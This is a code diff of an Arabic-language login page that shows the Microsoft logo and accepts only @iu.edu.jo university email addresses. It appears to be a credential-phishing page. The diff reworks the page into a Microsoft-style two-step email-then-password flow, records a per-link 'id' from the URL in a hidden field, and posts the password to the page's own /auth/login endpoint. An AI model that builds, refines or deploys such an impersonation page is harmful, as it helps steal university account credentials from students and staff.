@@ -11,7 +11,6 @@
       align-items: center;
       justify-content: center;
       height: 100vh;
-      margin: 0;
     }
     .login-box {
       background: #fff;
@@ -28,33 +27,26 @@
     .login-box h2 {
       margin-bottom: 20px;
       color: #333;
-      font-weight: normal;
     }
-    .form-control {
+    .input-group {
+      position: relative;
+      margin: 10px 0;
+    }
+    .input-group input {
       width: 100%;
       padding: 10px 35px 10px 10px;
-      margin: 10px 0;
       border: 1px solid #ccc;
       border-radius: 4px;
       text-align: left;
       direction: ltr;
-      font-size: 14px;
-      background-repeat: no-repeat;
-      background-position: 8px center;
-      background-size: 18px;
     }
-    .form-control.email {
-      background-image: url("https://img.icons8.com/ios-filled/50/000000/email.png");
-    }
-    .form-control.password {
-      background-image: url("https://img.icons8.com/ios-filled/50/000000/key-security.png");
-    }
-    .error {
-      color: #a80000;
-      font-size: 13px;
-      margin: 5px 0;
-      display: none;
-      text-align: right;
+    .input-group .icon {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 16px;
+      color: #666;
     }
     button {
       background: #0067b8;
@@ -65,63 +57,75 @@
       border-radius: 4px;
       cursor: pointer;
       font-size: 16px;
+      margin-top: 10px;
     }
     button:hover {
       background: #005a9e;
     }
-    .extra-links {
-      margin-top: 15px;
-      font-size: 13px;
-      text-align: right;
+    .error {
+      color: red;
+      margin-top: 10px;
+      font-size: 14px;
     }
-    .extra-links a {
+    .link {
+      margin-top: 15px;
+      display: block;
       color: #0067b8;
       text-decoration: none;
-    }
-    .extra-links a:hover {
-      text-decoration: underline;
+      font-size: 14px;
     }
   </style>
 </head>
 <body>
   <div class="login-box">
     <img src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo.svg" alt="Microsoft Logo">
-    <h2> تسجيل الدخول بإستخدام بريدك الجامعي</h2>
-    <form id="loginForm" action="/auth/login" method="POST">
-      <input type="email" name="email" class="form-control email" placeholder="البريد الإلكتروني" required>
-      <div id="emailError" class="error">❌ يجب أن ينتهي البريد بـ @iu.edu.jo</div>
+    <h2 id="title">تسجيل الدخول باستخدام بريدك الجامعي</h2>
 
-      <input type="password" name="password" class="form-control password" placeholder="كلمة المرور" required>
-      <!-- حقل مخفي لتخزين الرابط المطلوب -->
+    <!-- الخطوة الأولى: البريد -->
+    <div id="step1">
+      <div class="input-group">
+        <span class="icon">@</span>
+        <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+      </div>
+      <button onclick="nextStep()">التالي</button>
+      <div id="error1" class="error"></div>
+    </div>
+
+    <!-- الخطوة الثانية: كلمة المرور -->
+    <form id="step2" action="/auth/login" method="POST" style="display:none;">
+      <div class="input-group">
+        <span class="icon">🔑</span>
+        <input type="password" name="password" placeholder="كلمة المرور" required>
+      </div>
+      <input type="hidden" id="finalEmail" name="email">
       <input type="hidden" id="linkId" name="id">
       <button type="submit">تسجيل الدخول</button>
+      <a href="#" class="link">هل نسيت كلمة المرور؟</a>
     </form>
-
-    <div class="extra-links">
-      <a href="#">هل نسيت كلمة المرور؟</a>
-    </div>
   </div>
 
   <script>
-    // قراءة قيمة id من رابط الصفحة وإضافتها للحقل المخفي
     const params = new URLSearchParams(window.location.search);
     const linkId = params.get('id');
     if (linkId) {
       document.getElementById('linkId').value = linkId;
     }
 
-    // التحقق من البريد
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-      const emailInput = this.email.value.trim();
-      const errorMsg = document.getElementById('emailError');
+    function nextStep() {
+      const email = document.getElementById('email').value.trim();
+      const error1 = document.getElementById('error1');
 
-      if (!emailInput.endsWith('@iu.edu.jo')) {
-        e.preventDefault();
-        errorMsg.style.display = 'block';
-      } else {
-        errorMsg.style.display = 'none';
+      if (!email.endsWith('@iu.edu.jo')) {
+        error1.textContent = '❌ يجب إدخال بريد ينتهي بـ @iu.edu.jo';
+        return;
       }
-    });
+
+      // إذا البريد صحيح → الانتقال للخطوة الثانية
+      document.getElementById('finalEmail').value = email;
+      document.getElementById('step1').style.display = 'none';
+      document.getElementById('step2').style.display = 'block';
+      document.getElementById('title').textContent = email;
+    }
   </script>
 </body>
 </html>
